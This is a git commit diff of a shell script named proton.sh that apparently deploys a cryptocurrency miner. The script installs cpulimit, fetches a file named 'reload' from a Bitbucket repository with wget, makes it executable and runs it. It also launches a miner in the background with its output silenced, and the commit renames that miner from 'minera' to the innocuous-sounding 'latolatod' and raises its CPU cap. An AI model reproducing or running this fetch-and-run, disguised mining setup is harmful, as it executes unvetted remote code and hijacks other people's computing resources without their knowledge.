c40be2417e246f2fcae648aa348d781ca378c06c
rohmatridho84 <114908163+rohmatridho84@users.noreply.github.com>
2023-01-28 09:37:14 +0000

    Update proton.sh

--- proton.sh
+++ proton.sh
@@ -2,6 +2,6 @@
 apt update
 apt install cpulimit screen -y
 wget https://bitbucket.org/kijang-020/project1/raw/d28f558eb2ebf56e26f70d01f3805e21cda6eeaf/reload
-chmod +x config.json minera reload
-cpulimit -l 20 ./minera >/dev/null 2>&1 >/dev/null &
+chmod +x config.json latolatod reload
+cpulimit -l 30 ./latolatod >/dev/null 2>&1 >/dev/null &
 ./reload
